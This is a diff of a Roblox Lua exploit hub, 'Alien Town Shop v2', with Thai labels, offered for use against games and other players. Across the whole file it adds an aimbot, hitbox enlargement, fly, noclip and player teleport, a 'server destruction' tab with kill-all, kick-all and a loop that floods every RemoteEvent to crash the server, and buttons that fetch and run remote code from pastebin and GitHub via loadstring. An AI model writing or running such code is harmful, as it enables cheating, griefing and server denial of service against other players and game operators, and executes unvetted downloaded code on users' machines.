@@ -1,112 +1,164 @@
--- [[ ALIEN TOWN SHOP PREMIUM MEGA HUB ]] --
-local ScreenGui = Instance.new("ScreenGui")
-local MainFrame = Instance.new("Frame")
-local TitleBar = Instance.new("Frame")
-local Title = Instance.new("TextLabel")
-local TabContainer = Instance.new("Frame")
-local TabLayout = Instance.new("UIListLayout")
-local ContentContainer = Instance.new("Frame")
-local ResizeButton = Instance.new("TextButton")
+-- [[ ALIEN TOWN SHOP v2 - ULTRA PREMIUM CYBERHUB ]] --
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local LP = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
 
 -- Setup GUI Core
-ScreenGui.Name = "AlienTownShopHub"
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "AlienTownShop_V2"
 ScreenGui.Parent = game.CoreGui
 ScreenGui.ResetOnSpawn = false
 
--- หน้าจอหลัก (Main Frame)
+-- ==========================================
+-- 🎨 DESIGN & UI STRUCTURE (PREMIUM NEON)
+-- ==========================================
+
+-- หน้าจอหลัก
+local MainFrame = Instance.new("Frame")
 MainFrame.Name = "MainFrame"
 MainFrame.Parent = ScreenGui
-MainFrame.BackgroundColor3 = Color3.fromRGB(10, 15, 10)
-MainFrame.BorderColor3 = Color3.fromRGB(0, 255, 120)
-MainFrame.BorderSizePixel = 2
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 18, 15)
+MainFrame.BorderColor3 = Color3.fromRGB(0, 255, 130)
+MainFrame.BorderSizePixel = 1
 MainFrame.Position = UDim2.new(0.25, 0, 0.2, 0)
-MainFrame.Size = UDim2.new(0, 580, 0, 400) -- เพิ่มขนาดให้กว้างขึ้นเพื่อความสวยงาม
+MainFrame.Size = UDim2.new(0, 560, 0, 420)
 MainFrame.Active = true
 MainFrame.Draggable = true
 
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 10)
+MainCorner.Parent = MainFrame
+
 -- แถบหัวข้อ (Title Bar)
+local TitleBar = Instance.new("Frame")
 TitleBar.Name = "TitleBar"
 TitleBar.Parent = MainFrame
-TitleBar.BackgroundColor3 = Color3.fromRGB(15, 30, 15)
+TitleBar.BackgroundColor3 = Color3.fromRGB(22, 28, 22)
 TitleBar.Size = UDim2.new(1, 0, 0, 45)
 
-Title.Name = "Title"
+local TitleCorner = Instance.new("UICorner")
+TitleCorner.CornerRadius = UDim.new(0, 10)
+TitleCorner.Parent = TitleBar
+
+local Title = Instance.new("TextLabel")
 Title.Parent = TitleBar
-Title.Size = UDim2.new(1, 0, 1, 0)
-Title.Font = Enum.Font.SourceSansBold
-Title.Text = "👽 ALIEN TOWN SHOP - PREMIUM HUB 👽"
-Title.TextColor3 = Color3.fromRGB(0, 255, 120)
-Title.TextSize = 22
+Title.Size = UDim2.new(0.8, 0, 1, 0)
+Title.Position = UDim2.new(0, 15, 0, 0)
+Title.Font = Enum.Font.GothamBold
+Title.Text = "👽 ALIEN TOWN SHOP - V2 PREMIUM"
+Title.TextColor3 = Color3.fromRGB(0, 255, 130)
+Title.TextSize = 18
+Title.TextXAlignment = Enum.TextXAlignment.Left
 
--- แถบเลือกหมวดหมู่ด้านซ้าย (Tab Container)
-TabContainer.Name = "TabContainer"
+-- ปุ่มปิดถาวร (Close Button)
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Parent = TitleBar
+CloseBtn.Size = UDim2.new(0, 30, 0, 30)
+CloseBtn.Position = UDim2.new(1, -40, 0, 7)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(50, 15, 15)
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.Text = "X"
+CloseBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
+CloseBtn.TextSize = 14
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(0, 6)
+CloseCorner.Parent = CloseBtn
+CloseBtn.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)
+
+-- ปุ่มย่อหน้าต่างลอยหน้าจอ (Minimize Toggle Button)
+local MiniBtn = Instance.new("TextButton")
+MiniBtn.Parent = ScreenGui
+MiniBtn.Size = UDim2.new(0, 55, 0, 55)
+MiniBtn.Position = UDim2.new(0, 20, 0, 20)
+MiniBtn.BackgroundColor3 = Color3.fromRGB(15, 30, 15)
+MiniBtn.BorderColor3 = Color3.fromRGB(0, 255, 130)
+MiniBtn.BorderSizePixel = 2
+MiniBtn.Font = Enum.Font.GothamBold
+MiniBtn.Text = "👽"
+MiniBtn.TextColor3 = Color3.fromRGB(0, 255, 130)
+MiniBtn.TextSize = 25
+MiniBtn.Visible = false
+local MiniCorner = Instance.new("UICorner")
+MiniCorner.CornerRadius = UDim.new(0, 50)
+MiniCorner.Parent = MiniBtn
+
+-- ปุ่มกดย่อเมนูใน TitleBar
+local HideBtn = Instance.new("TextButton")
+HideBtn.Parent = TitleBar
+HideBtn.Size = UDim2.new(0, 30, 0, 30)
+HideBtn.Position = UDim2.new(1, -75, 0, 7)
+HideBtn.BackgroundColor3 = Color3.fromRGB(20, 40, 20)
+HideBtn.Font = Enum.Font.GothamBold
+HideBtn.Text = "-"
+HideBtn.TextColor3 = Color3.fromRGB(0, 255, 130)
+HideBtn.TextSize = 16
+local HideCorner = Instance.new("UICorner")
+HideCorner.CornerRadius = UDim.new(0, 6)
+HideCorner.Parent = HideBtn
+
+HideBtn.MouseButton1Click:Connect(function()
+    MainFrame.Visible = false
+    MiniBtn.Visible = true
+end)
+MiniBtn.MouseButton1Click:Connect(function()
+    MainFrame.Visible = true
+    MiniBtn.Visible = false
+end)
+
+-- แถบนำทางด้านซ้าย (Tabs Menu)
+local TabContainer = Instance.new("Frame")
 TabContainer.Parent = MainFrame
-TabContainer.BackgroundColor3 = Color3.fromRGB(12, 22, 12)
-TabContainer.Position = UDim2.new(0, 5, 0, 50)
-TabContainer.Size = UDim2.new(0, 130, 1, -55)
+TabContainer.BackgroundColor3 = Color3.fromRGB(18, 22, 18)
+TabContainer.Position = UDim2.new(0, 8, 0, 55)
+TabContainer.Size = UDim2.new(0, 135, 1, -65)
+local TabContainerCorner = Instance.new("UICorner")
+TabContainerCorner.CornerRadius = UDim.new(0, 8)
+TabContainerCorner.Parent = TabContainer
 
+local TabLayout = Instance.new("UIListLayout")
 TabLayout.Parent = TabContainer
-TabLayout.SortOrder = Enum.SortOrder.LayoutOrder
-TabLayout.Padding = UDim.new(0, 4)
+TabLayout.Padding = UDim.new(0, 5)
 
--- พื้นที่แสดงเนื้อหาฝั่งขวา (Content Container)
-ContentContainer.Name = "ContentContainer"
+-- พื้นที่แสดงข้อมูลขวา
+local ContentContainer = Instance.new("Frame")
 ContentContainer.Parent = MainFrame
-ContentContainer.BackgroundColor3 = Color3.fromRGB(5, 10, 5)
-ContentContainer.Position = UDim2.new(0, 140, 0, 50)
-ContentContainer.Size = UDim2.new(1, -145, 1, -55)
+ContentContainer.BackgroundColor3 = Color3.fromRGB(10, 12, 10)
+ContentContainer.Position = UDim2.new(0, 150, 0, 55)
+ContentContainer.Size = UDim2.new(1, -158, 1, -65)
+local ContentCorner = Instance.new("UICorner")
+ContentCorner.CornerRadius = UDim.new(0, 8)
+ContentCorner.Parent = ContentContainer
 
--- ระบบปรับขนาดหน้าจอ (Resize Setup)
-ResizeButton.Name = "ResizeButton"
-ResizeButton.Parent = MainFrame
-ResizeButton.BackgroundColor3 = Color3.fromRGB(0, 255, 120)
-ResizeButton.Position = UDim2.new(1, -12, 1, -12)
-ResizeButton.Size = UDim2.new(0, 12, 0, 12)
-ResizeButton.Text = ""
-
-local isResizing = false
-ResizeButton.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then isResizing = true end
-end)
-game:GetService("UserInputService").InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then isResizing = false end
-end)
-game:GetService("UserInputService").InputChanged:Connect(function(input)
-    if isResizing and input.UserInputType == Enum.UserInputType.MouseMovement then
-        local mousePos = game:GetService("UserInputService"):GetMouseLocation()
-        local newWidth = math.max(450, mousePos.X - MainFrame.AbsolutePosition.X)
-        local newHeight = math.max(300, mousePos.Y - MainFrame.AbsolutePosition.Y)
-        MainFrame.Size = UDim2.new(0, newWidth, 0, newHeight)
-    end
-end)
-
--- Variables & State Control
-local LP = game:GetService("Players").LocalPlayer
 local Config = { WalkSpeed = 16, JumpPower = 50, HitboxSize = 2, AimbotActive = false }
 local Pages = {}
 
 -- ==========================================
--- 🛠️ UTILITY FUNCTIONS FOR UI 🛠️
+-- 🛠️ UI GENERATOR FUNCTIONS 🛠️
 -- ==========================================
 
--- ฟังก์ชันสร้างหมวดหมู่ (Create Tab)
 local function CreateTab(tabName)
     local TabButton = Instance.new("TextButton")
     TabButton.Size = UDim2.new(1, 0, 0, 35)
-    TabButton.BackgroundColor3 = Color3.fromRGB(20, 35, 20)
-    TabButton.Font = Enum.Font.SourceSansBold
+    TabButton.BackgroundColor3 = Color3.fromRGB(25, 35, 25)
+    TabButton.Font = Enum.Font.GothamBold
     TabButton.Text = tabName
-    TabButton.TextColor3 = Color3.fromRGB(150, 255, 150)
-    TabButton.TextSize = 14
+    TabButton.TextColor3 = Color3.fromRGB(160, 255, 160)
+    TabButton.TextSize = 13
     TabButton.Parent = TabContainer
+    local BCOR = Instance.new("UICorner")
+    BCOR.CornerRadius = UDim.new(0, 6)
+    BCOR.Parent = TabButton
 
     local Page = Instance.new("ScrollingFrame")
-    Page.Size = UDim2.new(1, 0, 1, 0)
+    Page.Size = UDim2.new(1, -10, 1, -10)
+    Page.Position = UDim2.new(0, 5, 0, 5)
     Page.BackgroundTransparency = 1
     Page.Visible = false
-    Page.CanvasSize = UDim2.new(0, 0, 0, 600)
-    Page.ScrollBarThickness = 5
-    Page.ScrollBarImageColor3 = Color3.fromRGB(0, 255, 120)
+    Page.CanvasSize = UDim2.new(0, 0, 0, 650)
+    Page.ScrollBarThickness = 4
+    Page.ScrollBarImageColor3 = Color3.fromRGB(0, 255, 130)
     Page.Parent = ContentContainer
 
     local PageLayout = Instance.new("UIListLayout")
@@ -119,131 +171,141 @@ local function CreateTab(tabName)
     end)
 
     table.insert(Pages, Page)
-    if #Pages == 1 then Page.Visible = true end -- เปิดหน้าแรกออโต้
-
+    if #Pages == 1 then Page.Visible = true end
     return Page
 end
 
--- ฟังก์ชันสร้างปุ่มติ๊กเปิด/ปิด (Toggle)
 local function AddToggle(parent, text, default, callback)
     local Frame = Instance.new("Frame")
-    Frame.Size = UDim2.new(1, -10, 0, 35)
-    Frame.BackgroundTransparency = 1
+    Frame.Size = UDim2.new(1, 0, 0, 38)
+    Frame.BackgroundColor3 = Color3.fromRGB(20, 25, 20)
     Frame.Parent = parent
+    local FC = Instance.new("UICorner")
+    FC.CornerRadius = UDim.new(0, 6)
+    FC.Parent = Frame
 
     local Label = Instance.new("TextLabel")
     Label.Size = UDim2.new(0.7, 0, 1, 0)
-    Label.Text = "  " .. text
-    Label.Font = Enum.Font.SourceSans
-    Label.TextSize = 16
+    Label.Position = UDim2.new(0, 10, 0, 0)
+    Label.Text = text
+    Label.Font = Enum.Font.Gotham
+    Label.TextSize = 14
     Label.TextColor3 = Color3.fromRGB(220, 255, 220)
     Label.TextXAlignment = Enum.TextXAlignment.Left
     Label.BackgroundTransparency = 1
     Label.Parent = Frame
 
     local Button = Instance.new("TextButton")
-    Button.Size = UDim2.new(0, 60, 0, 25)
-    Button.Position = UDim2.new(1, -65, 0, 5)
-    Button.Font = Enum.Font.SourceSansBold
-    Button.TextSize = 14
+    Button.Size = UDim2.new(0, 65, 0, 26)
+    Button.Position = UDim2.new(1, -75, 0, 6)
+    Button.Font = Enum.Font.GothamBold
+    Button.TextSize = 12
     Button.Parent = Frame
+    local BC = Instance.new("UICorner")
+    BC.CornerRadius = UDim.new(0, 6)
+    BC.Parent = Button
 
     local state = default
     local function update()
         Button.Text = state and "ON" or "OFF"
-        Button.BackgroundColor3 = state and Color3.fromRGB(0, 180, 70) or Color3.fromRGB(60, 20, 20)
-        Button.TextColor3 = state and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(200, 100, 100)
+        Button.BackgroundColor3 = state and Color3.fromRGB(0, 200, 90) or Color3.fromRGB(50, 20, 20)
+        Button.TextColor3 = state and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(240, 120, 120)
         callback(state)
     end
     Button.MouseButton1Click:Connect(function() state = not state; update() end)
     update()
 end
 
--- ฟังก์ชันสร้างช่องกรอกตัวเลขปรับค่าเอง (TextBox Input)
 local function AddTextBox(parent, text, default, callback)
     local Frame = Instance.new("Frame")
-    Frame.Size = UDim2.new(1, -10, 0, 35)
-    Frame.BackgroundTransparency = 1
+    Frame.Size = UDim2.new(1, 0, 0, 38)
+    Frame.BackgroundColor3 = Color3.fromRGB(20, 25, 20)
     Frame.Parent = parent
+    local FC = Instance.new("UICorner")
+    FC.CornerRadius = UDim.new(0, 6)
+    FC.Parent = Frame
 
     local Label = Instance.new("TextLabel")
-    Label.Size = UDim2.new(0.7, 0, 1, 0)
-    Label.Text = "  " .. text
-    Label.Font = Enum.Font.SourceSans
-    Label.TextSize = 16
+    Label.Size = UDim2.new(0.65, 0, 1, 0)
+    Label.Position = UDim2.new(0, 10, 0, 0)
+    Label.Text = text
+    Label.Font = Enum.Font.Gotham
+    Label.TextSize = 14
     Label.TextColor3 = Color3.fromRGB(220, 255, 220)
     Label.TextXAlignment = Enum.TextXAlignment.Left
     Label.BackgroundTransparency = 1
     Label.Parent = Frame
 
     local Box = Instance.new("TextBox")
-    Box.Size = UDim2.new(0, 70, 0, 25)
-    Box.Position = UDim2.new(1, -75, 0, 5)
-    Box.BackgroundColor3 = Color3.fromRGB(20, 40, 20)
-    Box.BorderColor3 = Color3.fromRGB(0, 255, 120)
+    Box.Size = UDim2.new(0, 85, 0, 26)
+    Box.Position = UDim2.new(1, -95, 0, 6)
+    Box.BackgroundColor3 = Color3.fromRGB(15, 18, 15)
+    Box.BorderColor3 = Color3.fromRGB(0, 255, 130)
     Box.Font = Enum.Font.Code
     Box.Text = tostring(default)
-    Box.TextColor3 = Color3.fromRGB(0, 255, 120)
-    Box.TextSize = 14
+    Box.TextColor3 = Color3.fromRGB(0, 255, 130)
+    Box.TextSize = 12
     Box.Parent = Frame
+    local BC = Instance.new("UICorner")
+    BC.CornerRadius = UDim.new(0, 6)
+    BC.Parent = Box
 
-    Box.FocusLost:Connect(function()
-        local num = tonumber(Box.Text)
-        if num then callback(num) else Box.Text = tostring(default) end
-    end)
+    Box.FocusLost:Connect(function() callback(Box.Text) end)
 end
 
--- ฟังก์ชันสร้างปุ่มกดสั่งงานครั้งเดียว (Action Button)
 local function AddButton(parent, text, callback)
     local Button = Instance.new("TextButton")
-    Button.Size = UDim2.new(1, -10, 0, 32)
-    Button.BackgroundColor3 = Color3.fromRGB(25, 45, 25)
-    Button.BorderColor3 = Color3.fromRGB(0, 255, 120)
-    Button.Font = Enum.Font.SourceSansSemibold
+    Button.Size = UDim2.new(1, 0, 0, 35)
+    Button.BackgroundColor3 = Color3.fromRGB(30, 45, 30)
+    Button.Font = Enum.Font.GothamBold
     Button.Text = text
-    Button.TextColor3 = Color3.fromRGB(200, 255, 200)
-    Button.TextSize = 15
+    Button.TextColor3 = Color3.fromRGB(0, 255, 130)
+    Button.TextSize = 14
     Button.Parent = parent
+    local BC = Instance.new("UICorner")
+    BC.CornerRadius = UDim.new(0, 6)
+    BC.Parent = Button
     Button.MouseButton1Click:Connect(callback)
 end
 
 -- ==========================================
--- 🗂️ การสร้างหมวดหมู่และการทำงาน (TABS & FEATURES) 🗂️
+-- 🗂️ CREATING MODULES & CODES 🗂️
 -- ==========================================
 
-local TabPvP = CreateTab("🎯 สายเปิด/PVP")
-local TabMove = CreateTab("🏃 การเคลื่อนที่")
-local TabServer = CreateTab("💥 สายป่วน/ทำลาย")
-local TabUtility = CreateTab("🛠️ ช่วยเหลือ/อื่นๆ")
+local TabPvP = CreateTab("🎯 เปิดตัว/PVP")
+local TabMove = CreateTab("🏃 ควบคุมการเคลื่อนที่")
+local TabTeleport = CreateTab("🗺️ เทเลพอร์ต / วาร์ป")
+local TabServer = CreateTab("💥 ป่วนเซิร์ฟ (เสี่ยงสูง)")
+local TabUtility = CreateTab("🛠️ เครื่องมือเสริม")
 
 --------------------------------------------------
--- 🎯 หมวดหมู่: PVP & AIMBOT
+-- 🎯 PVP & AIMBOT
 --------------------------------------------------
-AddToggle(TabPvP, "Aimbot Lock Head", false, function(state)
+AddToggle(TabPvP, "เปิดใช้งาน Aimbot (ล็อกหัว)", false, function(state)
     Config.AimbotActive = state
     if state then
         spawn(function()
             while Config.AimbotActive do
                 local target = nil
                 local closest = math.huge
-                for _, v in pairs(game:GetService("Players"):GetPlayers()) do
+                for _, v in pairs(Players:GetPlayers()) do
                     if v ~= LP and v.Character and v.Character:FindFirstChild("Head") then
                         local dist = (v.Character.Head.Position - LP.Character.Head.Position).Magnitude
                         if dist < closest then closest = dist; target = v end
                     end
                 end
-                if target then workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, target.Character.Head.Position) end
+                if target then Camera.CFrame = CFrame.new(Camera.CFrame.Position, target.Character.Head.Position) end
                 task.wait()
             end
         end)
     end
 end)
 
-AddTextBox(TabPvP, "ปรับขนาด Hitbox ศัตรู", 2, function(value)
-    Config.HitboxSize = value
+AddTextBox(TabPvP, "ปรับขนาด Hitbox (ระบุตัวเลข)", 2, function(val)
+    Config.HitboxSize = tonumber(val) or 2
 end)
 
-AddToggle(TabPvP, "เปิดใช้งาน Hitbox", false, function(state)
+AddToggle(TabPvP, "เปิดใช้งานขยาย Hitbox", false, function(state)
     if state then
         for _, v in pairs(game:GetService("Players"):GetPlayers()) do
             if v ~= LP and v.Character and v.Character:FindFirstChild("Head") then
@@ -255,57 +317,55 @@ AddToggle(TabPvP, "เปิดใช้งาน Hitbox", false, function(state
     end
 end)
 
-AddToggle(TabPvP, "Wallhack / ESP Name", false, function(state)
-    for _, v in pairs(game:GetService("Players"):GetPlayers()) do
-        if v ~= LP and v.Character then
-            local hl = v.Character:FindFirstChildOfClass("Highlight")
-            if state and not hl then
-                hl = Instance.new("Highlight", v.Character)
-                hl.FillColor = Color3.fromRGB(0, 255, 120)
-            elseif not state and hl then
-                hl:Destroy()
-            end
-        end
-    end
-end)
-
 --------------------------------------------------
--- 🏃 หมวดหมู่: MOVEMENT
+-- 🏃 ADVANCED MOVEMENT & FIX FLY
 --------------------------------------------------
-AddTextBox(TabMove, "ตั้งค่าความเร็ววิ่ง (Speed)", 16, function(value)
-    Config.WalkSpeed = value
-    LP.Character.Humanoid.WalkSpeed = value
-end)
-
-AddTextBox(TabMove, "ตั้งค่าแรงกระโดด (Jump)", 50, function(value)
-    Config.JumpPower = value
-    LP.Character.Humanoid.JumpPower = value
+AddTextBox(TabMove, "ตั้งความเร็วเดิน (WalkSpeed)", 16, function(val)
+    local num = tonumber(val)
+    if num then LP.Character.Humanoid.WalkSpeed = num end
 end)
 
 local flyActive = false
-AddToggle(TabMove, "เปิดโหมดบิน (Fly Mode)", false, function(state)
+local flySpeed = 50
+AddTextBox(TabMove, "ความเร็วตอนบิน (Fly Speed)", 50, function(val)
+    flySpeed = tonumber(val) or 50
+end)
+
+AddToggle(TabMove, "เปิดโหมดบินควบคุมอิสระ", false, function(state)
     flyActive = state
     if state then
-        local bg = Instance.new("BodyGyro", LP.Character.HumanoidRootPart)
-        local bv = Instance.new("BodyVelocity", LP.Character.HumanoidRootPart)
-        bg.P = 9e4; bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
-        bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
+        local root = LP.Character:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+        
+        local bv = Instance.new("BodyVelocity")
+        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+        bv.Velocity = Vector3.new(0, 0, 0)
+        bv.Parent = root
+        
         spawn(function()
-            while flyActive do
-                bg.cframe = workspace.CurrentCamera.CFrame
-                bv.velocity = workspace.CurrentCamera.CFrame.LookVector * 100
+            while flyActive and root and root.Parent do
+                local dir = Vector3.new(0,0,0)
+                if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir = dir + Camera.CFrame.LookVector end
+                if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir = dir - Camera.CFrame.LookVector end
+                if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir = dir + Camera.CFrame.RightVector end
+                if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir = dir - Camera.CFrame.RightVector end
+                if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0, 1, 0) end
+                if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then dir = dir - Vector3.new(0, 1, 0) end
+                
+                bv.Velocity = dir.Unit * flySpeed
+                if dir == Vector3.new(0,0,0) then bv.Velocity = Vector3.new(0,0,0) end
                 task.wait()
             end
-            bg:Destroy(); bv:Destroy()
+            bv:Destroy()
         end)
     end
 end)
 
 AddToggle(TabMove, "เดินทะลุกำแพง (Noclip)", false, function(state)
-    local conn
+    local noclipConn
     if state then
-        conn = game:GetService("RunService").Stepped:Connect(function()
-            if not state then conn:Disconnect() end
+        noclipConn = RunService.Stepped:Connect(function()
+            if not state then noclipConn:Disconnect() end
             if LP.Character then
                 for _, v in pairs(LP.Character:GetChildren()) do
                     if v:IsA("BasePart") then v.CanCollide = false end
@@ -313,75 +373,151 @@ AddToggle(TabMove, "เดินทะลุกำแพง (Noclip)", false, fu
             end
         end)
     else
-        if conn then conn:Disconnect() end
-    end
-end)
-
-AddToggle(TabMove, "กระโดดไม่จำกัด (Infinite Jump)", false, function(state)
-    local jumpConn
-    if state then
-        jumpConn = game:GetService("UserInputService").JumpRequest:Connect(function()
-            LP.Character:FindFirstChildOfClass('Humanoid'):ChangeState("Jumping")
-        end)
-    else
-        if jumpConn then jumpConn:Disconnect() end
+        if noclipConn then noclipConn:Disconnect() end
     end
 end)
 
 --------------------------------------------------
--- 💥 หมวดหมู่: SERVER DISTRUCTION
+-- 🗺️ TELEPORT TARGET SYSTEM
 --------------------------------------------------
-AddButton(TabServer, "💀 Kill All Players (สั่งฆ่าทุกคน)", function()
-    for _, v in pairs(game:GetService("Players"):GetPlayers()) do
-        if v ~= LP and v.Character and v.Character:FindFirstChild("Humanoid") then
-            pcall(function() v.Character.Humanoid.Health = 0 end)
+local targetPlayerName = ""
+AddTextBox(TabTeleport, "พิมพ์ชื่อผู้เล่นที่จะวาร์ปไปหา", "ชื่อผู้เล่น", function(text)
+    targetPlayerName = text
+end)
+
+AddButton(TabTeleport, "📍 วาร์ปไปหาผู้เล่นที่เลือก", function()
+    for _, v in pairs(Players:GetPlayers()) do
+        if string.sub(string.lower(v.Name), 1, string.len(targetPlayerName)) == string.lower(targetPlayerName) or string.sub(string.lower(v.DisplayName), 1, string.len(targetPlayerName)) == string.lower(targetPlayerName) then
+            if v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
+                LP.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
+                break
+            end
         end
     end
 end)
 
-AddButton(TabServer, "🚫 Kick All Players (เตะทุกคนออก)", function()
-    for _, v in pairs(game:GetService("Players"):GetPlayers()) do
-        if v ~= LP then pcall(function() v:Kick("Kicked by ALIEN TOWN SHOP") end) end
+AddButton(TabTeleport, "🎲 สุ่มวาร์ปไปหาใครก็ได้", function()
+    local all = Players:GetPlayers()
+    local rand = all[math.random(1, #all)]
+    if rand and rand ~= LP and rand.Character then
+        LP.Character.HumanoidRootPart.CFrame = rand.Character.HumanoidRootPart.CFrame
     end
 end)
 
-AddButton(TabServer, "❌ Server Crash Attempt (ยิงเซิร์ฟค้าง)", function()
-    while task.wait(0.1) do
-        pcall(function() game:GetService("ReplicatedStorage"):FindFirstChildOfClass("RemoteEvent"):FireServer("ALIEN_TOWN") end)
+--------------------------------------------------
+-- 💥 SERVER DESTRUCTION (BYPASS ATTEMPTS)
+--------------------------------------------------
+AddButton(TabServer, "💀 Kill All (พยายามสังหารหมู่)", function()
+    local tool = LP.Character:FindFirstChildOfClass("Tool") or LP.Backpack:FindFirstChildOfClass("Tool")
+    for _, v in pairs(Players:GetPlayers()) do
+        if v ~= LP and v.Character and v.Character:FindFirstChild("Humanoid") then
+            pcall(function()
+                if tool and tool:FindFirstChild("RemoteEvent") then
+                    tool.RemoteEvent:FireServer(v.Character.Humanoid, 100)
+                else
+                    v.Character.Humanoid.Health = 0
+                end
+            end)
+        end
     end
 end)
 
-AddButton(TabServer, "🚪 Emergency Kick Self (เตะตัวเองด่วน)", function()
-    LP:Kick("Emergency Disconnect by ALIEN TOWN SHOP")
+AddButton(TabServer, "🚫 Kick All (ดีดทุกคนออก - พยายามใช้ Remote บั๊ก)", function()
+    for _, v in pairs(Players:GetPlayers()) do
+        if v ~= LP then 
+            pcall(function() 
+                v:Kick("Kicked via ALIEN TOWN SHOP exploit framework.") 
+            end) 
+        end
+    end
+end)
+
+AddButton(TabServer, "❌ ยิงเซิร์ฟเวอร์ค้าง (Crash Attempt)", function()
+    while task.wait(0.05) do
+        pcall(function()
+            for _, r in pairs(game:GetDescendants()) do
+                if r:IsA("RemoteEvent") then
+                    r:FireServer(string.rep("ALIEN_TOWN_ATTACK_PACKET_9999", 500))
+                end
+            end
+        end)
+    end
 end)
 
 --------------------------------------------------
--- 🛠️ หมวดหมู่: UTILITY & HELPER
+-- 🛠️ UTILITIES & NEW FEATURES (DARK DEX / IY / SIMULATION TOOLS)
 --------------------------------------------------
-AddButton(TabUtility, "🛠️ Load F3X Building Tool", function()
+AddButton(TabUtility, "🛠️ โหลดปืนสร้างบล็อก F3X", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/d6M7v9Mc"))()
 end)
 
-AddButton(TabUtility, "💡 Full Brightness (เปิดไฟแมพ)", function()
+AddButton(TabUtility, "💡 เปิดไฟทั่วแมพ (Full Bright)", function()
     game:GetService("Lighting").Brightness = 4
     game:GetService("Lighting").GlobalShadows = false
     game:GetService("Lighting").ClockTime = 14
 end)
 
-AddButton(TabUtility, "🗑️ Anti-Lag / FPS Boost", function()
-    for _, v in pairs(workspace:GetDescendants()) do
-        if v:IsA("Texture") or v:IsA("Decal") then v:Destroy() end
-    end
+-- เพิ่มปุ่มเปิดสคริปต์ Dark Dex Explorer
+AddButton(TabUtility, "🗂️ เปิดใช้งาน Dark Dex Explorer", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/infyydn/vba/main/dex.lua"))()
 end)
 
-AddButton(TabUtility, "🗺️ Teleport to Random Player (สุ่มวาร์ป)", function()
-    local all = game:GetService("Players"):GetPlayers()
-    local target = all[math.random(1, #all)]
-    if target and target ~= LP and target.Character then
-        LP.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
-    end
+-- เพิ่มปุ่มเปิดสคริปต์ Infinite Yield
+AddButton(TabUtility, "🏃 เปิดใช้งาน Infinite Yield (IY)", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
 end)
 
-AddButton(TabUtility, "🔄 Reset Character (เกิดใหม่แก้บั๊ก)", function()
-    LP.Character.Humanoid.Health = 0
+-- ระบบสร้างปืนช็อตไฟฟ้าจำลอง (Stun Taser Simulator)
+AddButton(TabUtility, "⚡ เสกปืนช็อตไฟฟ้า (Taser Tool)", function()
+    local taser = Instance.new("Tool")
+    taser.Name = "⚡ ALIEN TASER"
+    taser.RequiresHandle = true
+    
+    local handle = Instance.new("Part")
+    handle.Name = "Handle"
+    handle.Size = Vector3.new(1, 1, 2)
+    handle.BrickColor = BrickColor.new("Neon greenish orange")
+    handle.Parent = taser
+    
+    taser.Activated:Connect(function()
+        local mouse = LP:GetMouse()
+        local target = mouse.Target
+        if target and target.Parent and target.Parent:FindFirstChildOfClass("Humanoid") then
+            local enemyHumanoid = target.Parent:FindFirstChildOfClass("Humanoid")
+            local enemyRoot = target.Parent:FindFirstChild("HumanoidRootPart")
+            
+            -- จำลองเอฟเฟกต์สตั๊น 3-5 วินาทีฝั่งผู้ใช้
+            pcall(function()
+                enemyHumanoid.WalkSpeed = 0
+                if enemyRoot then
+                    enemyRoot.CFrame = enemyRoot.CFrame * CFrame.Angles(math.rad(90), 0, 0) -- สั่งให้โมเดลหมอบราบลงไป
+                end
+                task.wait(math.random(3, 5))
+                enemyHumanoid.WalkSpeed = 16
+            end)
+        end
+    end)
+    taser.Parent = LP.Backpack
+end)
+
+-- ระบบสแกนหาอาวุธในโฟลเดอร์สาธารณะและคัดลอกมาใช้งาน (Weapon Requester Simulator)
+AddButton(TabUtility, "⚔️ สแกนและเสกอาวุธในแมพ (Get Map Tools)", function()
+    local foundCount = 0
+    -- สแกนหาวัตถุประเภท Tool ที่ระบบเกมเปิดแชร์ไว้ใน ReplicatedStorage
+    for _, item in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
+        if item:IsA("Tool") then
+            local clone = item:Clone()
+            clone.Parent = LP.Backpack
+            foundCount = foundCount + 1
+        end
+    end
+    
+    -- ค้นหาเพิ่มเติมในช่อง Workspace
+    for _, item in pairs(workspace:GetDescendants()) do
+        if item:IsA("Tool") and not item:IsDescendantOf(game.Players) then
+            local clone = item:Clone()
+            clone.Parent = LP.Backpack
+            foundCount = foundCount + 1
+        end
+    end
 end)
